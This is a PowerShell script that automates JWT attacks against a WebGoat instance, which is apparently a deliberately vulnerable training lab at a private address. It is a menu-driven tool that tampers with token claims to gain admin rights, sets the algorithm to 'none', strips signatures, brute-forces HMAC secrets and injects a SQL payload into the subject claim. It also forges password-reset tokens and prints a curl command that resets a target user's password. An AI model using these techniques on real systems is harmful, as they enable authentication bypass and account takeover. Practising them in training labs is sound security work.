# WebGoat JWT Automation Script
# Target: 192.168.254.112:8001

$webgoatUrl = "http://192.168.254.112:8001/WebGoat"
$jwtEndpoint = "$webgoatUrl/JWT"

Write-Host "================================================" -ForegroundColor Cyan
Write-Host "   WebGoat JWT Attack Automation" -ForegroundColor Cyan
Write-Host "   Target: $webgoatUrl" -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan
Write-Host ""

# Function to decode JWT
function Decode-JWT {
    param([string]$token)
    
    $parts = $token.Split('.')
    if ($parts.Count -ne 3) {
        Write-Host "Invalid JWT format" -ForegroundColor Red
        return $null
    }
    
    $header = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Add-Base64Padding $parts[0])))
    $payload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Add-Base64Padding $parts[1])))
    
    return @{
        Header = $header | ConvertFrom-Json
        Payload = $payload | ConvertFrom-Json
        Signature = $parts[2]
        Raw = $token
    }
}

# Function to add Base64 padding
function Add-Base64Padding {
    param([string]$base64)
    
    $base64 = $base64.Replace('-', '+').Replace('_', '/')
    switch ($base64.Length % 4) {
        2 { return $base64 + "==" }
        3 { return $base64 + "=" }
        default { return $base64 }
    }
}

# Function to encode to Base64URL
function ConvertTo-Base64Url {
    param([string]$text)
    
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
    $base64 = [Convert]::ToBase64String($bytes)
    return $base64.Replace('+', '-').Replace('/', '_').TrimEnd('=')
}

# Function to tamper with JWT
function Tamper-JWT {
    param(
        [string]$token,
        [hashtable]$changes
    )
    
    $parts = $token.Split('.')
    if ($parts.Count -ne 3) {
        Write-Host "Invalid JWT format" -ForegroundColor Red
        return $null
    }
    
    # Decode payload
    $payloadJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Add-Base64Padding $parts[1])))
    $payload = $payloadJson | ConvertFrom-Json
    
    # Apply changes
    foreach ($key in $changes.Keys) {
        $payload | Add-Member -NotePropertyName $key -NotePropertyValue $changes[$key] -Force
    }
    
    # Encode new payload
    $newPayload = ConvertTo-Base64Url ($payload | ConvertTo-Json -Compress)
    
    # Return tampered token (keeping original signature)
    return "$($parts[0]).$newPayload.$($parts[2])"
}

# Function to change algorithm
function Change-Algorithm {
    param(
        [string]$token,
        [string]$newAlg,
        [switch]$removeSignature
    )
    
    $parts = $token.Split('.')
    if ($parts.Count -ne 3) {
        Write-Host "Invalid JWT format" -ForegroundColor Red
        return $null
    }
    
    # Decode header
    $headerJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Add-Base64Padding $parts[0])))
    $header = $headerJson | ConvertFrom-Json
    
    # Change algorithm
    $header.alg = $newAlg
    
    # Encode new header
    $newHeader = ConvertTo-Base64Url ($header | ConvertTo-Json -Compress)
    
    # Build new token
    if ($removeSignature) {
        return "$newHeader.$($parts[1])."
    } else {
        return "$newHeader.$($parts[1]).$($parts[2])"
    }
}

# Function to sign JWT with HMAC-SHA256
function Sign-JWT {
    param(
        [string]$header,
        [string]$payload,
        [string]$secret
    )
    
    $headerEncoded = ConvertTo-Base64Url $header
    $payloadEncoded = ConvertTo-Base64Url $payload
    $message = "$headerEncoded.$payloadEncoded"
    
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($secret)
    $signature = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($message))
    $signatureBase64 = [Convert]::ToBase64String($signature).Replace('+', '-').Replace('/', '_').TrimEnd('=')
    
    return "$message.$signatureBase64"
}

# Function to brute force JWT secret
function BruteForce-JWTSecret {
    param(
        [string]$token,
        [string[]]$wordlist
    )
    
    Write-Host "Starting brute force attack..." -ForegroundColor Yellow
    Write-Host "Testing $($wordlist.Count) secrets..." -ForegroundColor Yellow
    
    $parts = $token.Split('.')
    if ($parts.Count -ne 3) {
        Write-Host "Invalid JWT format" -ForegroundColor Red
        return $null
    }
    
    $message = "$($parts[0]).$($parts[1])"
    $originalSignature = $parts[2]
    
    $count = 0
    foreach ($secret in $wordlist) {
        $count++
        if ($count % 100 -eq 0) {
            Write-Host "  Tested $count secrets..." -ForegroundColor Gray
        }
        
        $hmac = New-Object System.Security.Cryptography.HMACSHA256
        $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($secret)
        $signature = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($message))
        $signatureBase64 = [Convert]::ToBase64String($signature).Replace('+', '-').Replace('/', '_').TrimEnd('=')
        
        if ($signatureBase64 -eq $originalSignature) {
            Write-Host ""
            Write-Host "SUCCESS! Found secret: $secret" -ForegroundColor Green
            return $secret
        }
    }
    
    Write-Host ""
    Write-Host "Secret not found in wordlist" -ForegroundColor Red
    return $null
}

# Function to send JWT request
function Send-JWTRequest {
    param(
        [string]$url,
        [string]$token,
        [string]$method = "GET",
        [string]$body = $null
    )
    
    $headers = @{
        "Authorization" = "Bearer $token"
        "Content-Type" = "application/json"
    }
    
    try {
        if ($method -eq "GET") {
            $response = Invoke-WebRequest -Uri $url -Headers $headers -Method Get -UseBasicParsing
        } else {
            $response = Invoke-WebRequest -Uri $url -Headers $headers -Method Post -Body $body -UseBasicParsing
        }
        
        Write-Host "Response Status: $($response.StatusCode)" -ForegroundColor Green
        Write-Host "Response:" -ForegroundColor Cyan
        Write-Host $response.Content
        return $response
    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            $responseBody = $reader.ReadToEnd()
            Write-Host "Response: $responseBody" -ForegroundColor Yellow
        }
    }
}

# Main Menu
function Show-Menu {
    Write-Host ""
    Write-Host "Select an attack method:" -ForegroundColor Cyan
    Write-Host "1. Decode JWT Token" -ForegroundColor White
    Write-Host "2. Tamper JWT - Make Admin (admin: true)" -ForegroundColor White
    Write-Host "3. Tamper JWT - Change Username to Admin" -ForegroundColor White
    Write-Host "4. Tamper JWT - SQL Injection in Username" -ForegroundColor White
    Write-Host "5. Algorithm to 'none' (with signature)" -ForegroundColor White
    Write-Host "6. Algorithm to 'none' (remove signature)" -ForegroundColor White
    Write-Host "7. Remove Signature Only" -ForegroundColor White
    Write-Host "8. Brute Force Secret" -ForegroundColor White
    Write-Host "9. Sign New Token with Secret" -ForegroundColor White
    Write-Host "10. Password Reset Attack" -ForegroundColor White
    Write-Host "11. Custom Tamper (specify field)" -ForegroundColor White
    Write-Host "12. Send JWT Request" -ForegroundColor White
    Write-Host "0. Exit" -ForegroundColor Red
    Write-Host ""
}

# Main Loop
while ($true) {
    Show-Menu
    $choice = Read-Host "Enter your choice (0-12)"
    
    switch ($choice) {
        "1" {
            Write-Host ""
            $token = Read-Host "Enter JWT token"
            $decoded = Decode-JWT $token
            if ($decoded) {
                Write-Host ""
                Write-Host "Header:" -ForegroundColor Cyan
                Write-Host ($decoded.Header | ConvertTo-Json) -ForegroundColor White
                Write-Host ""
                Write-Host "Payload:" -ForegroundColor Cyan
                Write-Host ($decoded.Payload | ConvertTo-Json) -ForegroundColor White
                Write-Host ""
                Write-Host "Signature:" -ForegroundColor Cyan
                Write-Host $decoded.Signature -ForegroundColor White
            }
        }
        
        "2" {
            Write-Host ""
            $token = Read-Host "Enter JWT token"
            $newToken = Tamper-JWT $token @{ admin = $true }
            if ($newToken) {
                Write-Host ""
                Write-Host "Tampered Token (admin: true):" -ForegroundColor Green
                Write-Host $newToken -ForegroundColor White
                Write-Host ""
                Write-Host "Copied to clipboard!" -ForegroundColor Yellow
                Set-Clipboard $newToken
            }
        }
        
        "3" {
            Write-Host ""
            $token = Read-Host "Enter JWT token"
            $newToken = Tamper-JWT $token @{ sub = "admin"; name = "admin" }
            if ($newToken) {
                Write-Host ""
                Write-Host "Tampered Token (username: admin):" -ForegroundColor Green
                Write-Host $newToken -ForegroundColor White
                Write-Host ""
                Write-Host "Copied to clipboard!" -ForegroundColor Yellow
                Set-Clipboard $newToken
            }
        }
        
        "4" {
            Write-Host ""
            $token = Read-Host "Enter JWT token"
            $newToken = Tamper-JWT $token @{ sub = "admin' OR '1'='1" }
            if ($newToken) {
                Write-Host ""
                Write-Host "Tampered Token (SQL Injection):" -ForegroundColor Green
                Write-Host $newToken -ForegroundColor White
                Write-Host ""
                Write-Host "Copied to clipboard!" -ForegroundColor Yellow
                Set-Clipboard $newToken
            }
        }
        
        "5" {
            Write-Host ""
            $token = Read-Host "Enter JWT token"
            $newToken = Change-Algorithm $token "none"
            if ($newToken) {
                Write-Host ""
                Write-Host "Token with 'none' algorithm:" -ForegroundColor Green
                Write-Host $newToken -ForegroundColor White
                Write-Host ""
                Write-Host "Copied to clipboard!" -ForegroundColor Yellow
                Set-Clipboard $newToken
            }
        }
        
        "6" {
            Write-Host ""
            $token = Read-Host "Enter JWT token"
            $newToken = Change-Algorithm $token "none" -removeSignature
            if ($newToken) {
                Write-Host ""
                Write-Host "Token with 'none' algorithm (no signature):" -ForegroundColor Green
                Write-Host $newToken -ForegroundColor White
                Write-Host ""
                Write-Host "Copied to clipboard!" -ForegroundColor Yellow
                Set-Clipboard $newToken
            }
        }
        
        "7" {
            Write-Host ""
            $token = Read-Host "Enter JWT token"
            $parts = $token.Split('.')
            $newToken = "$($parts[0]).$($parts[1])."
            Write-Host ""
            Write-Host "Token without signature:" -ForegroundColor Green
            Write-Host $newToken -ForegroundColor White
            Write-Host ""
            Write-Host "Copied to clipboard!" -ForegroundColor Yellow
            Set-Clipboard $newToken
        }
        
        "8" {
            Write-Host ""
            $token = Read-Host "Enter JWT token"
            Write-Host ""
            Write-Host "Using common secrets wordlist..." -ForegroundColor Yellow
            
            $wordlist = @(
                "secret", "webgoat", "password", "123456", "admin", "test",
                "qwerty", "letmein", "welcome", "password123", "admin123",
                "jwt", "token", "key", "supersecret", "mysecret", "12345",
                "root", "toor", "default", "changeme", "pass", "pass123"
            )
            
            $foundSecret = BruteForce-JWTSecret $token $wordlist
            
            if ($foundSecret) {
                Write-Host ""
                Write-Host "You can now use option 9 to sign a new token with this secret" -ForegroundColor Cyan
            }
        }
        
        "9" {
            Write-Host ""
            $payloadJson = Read-Host "Enter payload JSON (e.g., {'sub':'admin','admin':true})"
            $secret = Read-Host "Enter secret key"
            
            $header = '{"alg":"HS256","typ":"JWT"}'
            $newToken = Sign-JWT $header $payloadJson $secret
            
            Write-Host ""
            Write-Host "Signed Token:" -ForegroundColor Green
            Write-Host $newToken -ForegroundColor White
            Write-Host ""
            Write-Host "Copied to clipboard!" -ForegroundColor Yellow
            Set-Clipboard $newToken
        }
        
        "10" {
            Write-Host ""
            $resetToken = Read-Host "Enter password reset JWT token"
            $targetUser = Read-Host "Enter target username (e.g., admin)"
            
            Write-Host ""
            Write-Host "Select reset method:" -ForegroundColor Cyan
            Write-Host "1. Change username + keep signature" -ForegroundColor White
            Write-Host "2. Change username + remove signature" -ForegroundColor White
            Write-Host "3. Change username + algorithm 'none'" -ForegroundColor White
            $resetChoice = Read-Host "Choice"
            
            switch ($resetChoice) {
                "1" {
                    $newToken = Tamper-JWT $resetToken @{ sub = $targetUser; username = $targetUser }
                }
                "2" {
                    $tempToken = Tamper-JWT $resetToken @{ sub = $targetUser; username = $targetUser }
                    $parts = $tempToken.Split('.')
                    $newToken = "$($parts[0]).$($parts[1])."
                }
                "3" {
                    $tempToken = Tamper-JWT $resetToken @{ sub = $targetUser; username = $targetUser }
                    $newToken = Change-Algorithm $tempToken "none" -removeSignature
                }
            }
            
            if ($newToken) {
                Write-Host ""
                Write-Host "Password Reset Token:" -ForegroundColor Green
                Write-Host $newToken -ForegroundColor White
                Write-Host ""
                Write-Host "Copied to clipboard!" -ForegroundColor Yellow
                Set-Clipboard $newToken
                
                Write-Host ""
                Write-Host "Sample cURL command:" -ForegroundColor Cyan
                Write-Host "curl -X POST http://192.168.254.112:8001/WebGoat/PasswordReset/reset \\" -ForegroundColor Gray
                Write-Host "  -H 'Authorization: Bearer $newToken' \\" -ForegroundColor Gray
                Write-Host "  -H 'Content-Type: application/json' \\" -ForegroundColor Gray
                Write-Host "  -d '{\"password\": \"hacked123\"}'" -ForegroundColor Gray
            }
        }
        
        "11" {
            Write-Host ""
            $token = Read-Host "Enter JWT token"
            $field = Read-Host "Enter field name to add/modify"
            $value = Read-Host "Enter value"
            
            # Try to parse value as boolean or number
            $parsedValue = $value
            if ($value -eq "true" -or $value -eq "false") {
                $parsedValue = [bool]::Parse($value)
            } elseif ($value -match '^\d+$') {
                $parsedValue = [int]$value
            }
            
            $changes = @{}
            $changes[$field] = $parsedValue
            
            $newToken = Tamper-JWT $token $changes
            if ($newToken) {
                Write-Host ""
                Write-Host "Tampered Token:" -ForegroundColor Green
                Write-Host $newToken -ForegroundColor White
                Write-Host ""
                Write-Host "Copied to clipboard!" -ForegroundColor Yellow
                Set-Clipboard $newToken
            }
        }
        
        "12" {
            Write-Host ""
            $url = Read-Host "Enter endpoint URL (default: $jwtEndpoint/[endpoint])"
            if ([string]::IsNullOrWhiteSpace($url)) {
                $endpoint = Read-Host "Enter endpoint name"
                $url = "$jwtEndpoint/$endpoint"
            }
            $token = Read-Host "Enter JWT token"
            $method = Read-Host "Method (GET/POST, default: GET)"
            if ([string]::IsNullOrWhiteSpace($method)) { $method = "GET" }
            
            $body = $null
            if ($method -eq "POST") {
                $body = Read-Host "Enter POST body (JSON)"
            }
            
            Send-JWTRequest $url $token $method $body
        }
        
        "0" {
            Write-Host ""
            Write-Host "Exiting..." -ForegroundColor Yellow
            exit
        }
        
        default {
            Write-Host ""
            Write-Host "Invalid choice. Please try again." -ForegroundColor Red
        }
    }
}
